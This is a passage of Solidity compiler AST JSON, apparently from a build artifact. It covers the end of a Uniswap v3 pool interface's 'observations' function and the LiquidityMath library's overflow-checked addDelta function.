														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5298:200:8"
									},
									"scope": 2108,
									"src": "5220:279:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2094,
										"nodeType": "StructuredDocumentation",
										"src": "5505:749:8",
										"text": "@notice Returns data about a specific observation index\n @param index The element of the observations array to fetch\n @dev You most likely want to use #observe() instead of this method to get an observation as of some amount of time\n ago, rather than at a specific index in the array.\n @return blockTimestamp The timestamp of the observation,\n Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp,\n Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp,\n Returns initialized whether the observation has been initialized and the values are safe to use"
									},
									"functionSelector": "252c09d7",
									"id": 2107,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "observations",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2097,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2096,
												"mutability": "mutable",
												"name": "index",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2107,
												"src": "6281:13:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2095,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6281:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6280:15:8"
									},
									"returnParameters": {
										"id": 2106,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2099,
												"mutability": "mutable",
												"name": "blockTimestamp",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2107,
												"src": "6356:21:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 2098,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "6356:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2101,
												"mutability": "mutable",
												"name": "tickCumulative",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2107,
												"src": "6391:20:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int56",
													"typeString": "int56"
												},
												"typeName": {
													"id": 2100,
													"name": "int56",
													"nodeType": "ElementaryTypeName",
													"src": "6391:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int56",
														"typeString": "int56"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2103,
												"mutability": "mutable",
												"name": "secondsPerLiquidityCumulativeX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2107,
												"src": "6425:41:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 2102,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "6425:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2105,
												"mutability": "mutable",
												"name": "initialized",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2107,
												"src": "6480:16:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 2104,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "6480:4:8",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6342:164:8"
									},
									"scope": 2108,
									"src": "6259:248:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 2109,
							"src": "240:6269:8"
						}
					],
					"src": "45:6465:8"
				},
				"id": 8
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
					"exportedSymbols": {
						"LiquidityMath": [
							2160
						]
					},
					"id": 2161,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 2110,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:9"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 2111,
								"nodeType": "StructuredDocumentation",
								"src": "71:38:9",
								"text": "@title Math library for liquidity"
							},
							"fullyImplemented": true,
							"id": 2160,
							"linearizedBaseContracts": [
								2160
							],
							"name": "LiquidityMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 2158,
										"nodeType": "Block",
										"src": "456:163:9",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_int128",
														"typeString": "int128"
													},
													"id": 2123,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 2121,
														"name": "y",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2116,
														"src": "470:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_int128",
															"typeString": "int128"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 2122,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "474:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "470:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 2156,
													"nodeType": "Block",
													"src": "548:65:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint128",
																			"typeString": "uint128"
																		},
																		"id": 2152,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"id": 2149,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 2142,
																						"name": "z",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 2119,
																						"src": "571:1:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						},
																						"id": 2148,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 2143,
																							"name": "x",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 2114,
																							"src": "575:1:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "+",
																						"rightExpression": {
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"id": 2146,
																									"name": "y",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 2116,
																									"src": "587:1:9",
																									"typeDescriptions": {
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								],
																								"id": 2145,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "579:7:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_uint128_$",
																									"typeString": "type(uint128)"
																								},
																								"typeName": {
																									"id": 2144,
																									"name": "uint128",
																									"nodeType": "ElementaryTypeName",
																									"src": "579:7:9",
																									"typeDescriptions": {
																										"typeIdentifier": null,
																										"typeString": null
																									}
																								}
																							},
																							"id": 2147,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "579:10:9",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"src": "575:14:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"src": "571:18:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint128",
																						"typeString": "uint128"
																					}
																				}
																			],
																			"id": 2150,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "570:20:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": ">=",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 2151,
																			"name": "x",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2114,
																			"src": "594:1:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"src": "570:25:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"hexValue": "4c41",
																		"id": 2153,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "597:4:9",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_ce8fc98a1432efc8ba166615239eb1702fbbbd0ddab9a5952502a98483035383",
																			"typeString": "literal_string \"LA\""
																		},
																		"value": "LA"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		{
																			"typeIdentifier": "t_stringliteral_ce8fc98a1432efc8ba166615239eb1702fbbbd0ddab9a5952502a98483035383",
																			"typeString": "literal_string \"LA\""
																		}
																	],
																	"id": 2141,
																	"name": "require",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		-18,
																		-18
																	],
																	"referencedDeclaration": -18,
																	"src": "562:7:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																		"typeString": "function (bool,string memory) pure"
																	}
																},
																"id": 2154,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "562:40:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 2155,
															"nodeType": "ExpressionStatement",
															"src": "562:40:9"
														}
													]
												},
												"id": 2157,
												"nodeType": "IfStatement",
												"src": "466:147:9",
												"trueBody": {
													"id": 2140,
													"nodeType": "Block",
													"src": "477:65:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint128",
																			"typeString": "uint128"
																		},
																		"id": 2136,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"id": 2133,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 2125,
																						"name": "z",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 2119,
																						"src": "500:1:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						},
																						"id": 2132,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 2126,
																							"name": "x",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 2114,
																							"src": "504:1:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "-",
																						"rightExpression": {
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"id": 2130,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"nodeType": "UnaryOperation",
																									"operator": "-",
																									"prefix": true,
																									"src": "516:2:9",
																									"subExpression": {
																										"argumentTypes": null,
																										"id": 2129,
																										"name": "y",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 2116,
																										"src": "517:1:9",
																										"typeDescriptions": {
																											"typeIdentifier": "t_int128",
																											"typeString": "int128"
																										}
																									},
																									"typeDescriptions": {
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								],
																								"id": 2128,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "508:7:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_uint128_$",
																									"typeString": "type(uint128)"
																								},
																								"typeName": {
																									"id": 2127,
																									"name": "uint128",
																									"nodeType": "ElementaryTypeName",
																									"src": "508:7:9",
																									"typeDescriptions": {
																										"typeIdentifier": null,
																										"typeString": null
																									}
																								}
																							},
																							"id": 2131,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "508:11:9",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"src": "504:15:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"src": "500:19:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint128",
																						"typeString": "uint128"
																					}
																				}
																			],
																			"id": 2134,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "499:21:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "<",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 2135,
																			"name": "x",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2114,
																			"src": "523:1:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"src": "499:25:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"hexValue": "4c53",
																		"id": 2137,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "526:4:9",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_2be2231ccd52e7fedf30c30a3dfa3d6c9d9d3400159e305398a7b6d437f56985",
																			"typeString": "literal_string \"LS\""
																		},
																		"value": "LS"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		{
																			"typeIdentifier": "t_stringliteral_2be2231ccd52e7fedf30c30a3dfa3d6c9d9d3400159e305398a7b6d437f56985",
																			"typeString": "literal_string \"LS\""
																		}
																	],
																	"id": 2124,
																	"name": "require",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		-18,
																		-18
																	],
																	"referencedDeclaration": -18,
																	"src": "491:7:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																		"typeString": "function (bool,string memory) pure"
																	}
																},
																"id": 2138,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "491:40:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 2139,
															"nodeType": "ExpressionStatement",
															"src": "491:40:9"
														}
													]
												}
											}
										]
									},
									"documentation": {
										"id": 2112,
										"nodeType": "StructuredDocumentation",
										"src": "137:241:9",
										"text": "@notice Add a signed liquidity delta to liquidity and revert if it overflows or underflows\n @param x The liquidity before change\n @param y The delta by which liquidity should be changed\n @return z The liquidity delta"
									},
									"id": 2159,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "addDelta",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2117,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2114,
												"mutability": "mutable",
												"name": "x",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2159,
												"src": "401:9:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2113,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "401:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2116,
												"mutability": "mutable",
												"name": "y",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2159,
												"src": "412:8:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int128",
													"typeString": "int128"
												},
												"typeName": {
													"id": 2115,
													"name": "int128",
													"nodeType": "ElementaryTypeName",
													"src": "412:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_int128",
														"typeString": "int128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "400:21:9"
									},
									"returnParameters": {
										"id": 2120,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2119,
												"mutability": "mutable",
												"name": "z",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2159,
												"src": "445:9:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2118,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "445:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "444:11:9"
									},
									"scope": 2160,
									"src": "383:236:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 2161,
							"src": "109:512:9"
						}
					],
					"src": "45:577:9"
				},
				"id": 9
			}
		}
	}
}